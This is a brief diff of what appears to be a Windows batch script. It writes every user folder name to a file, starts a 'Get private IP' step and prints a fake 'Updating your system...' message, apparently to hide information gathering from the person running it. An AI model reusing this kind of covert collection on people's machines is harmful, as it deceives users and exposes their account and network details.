@@ -13,7 +13,6 @@ color 0e
 
 ::Get all usernames from computer.
 DIR C:\Users> usernames.txt
-E:
 
 ::Get private IP.
 echo 0%% Updating your system...
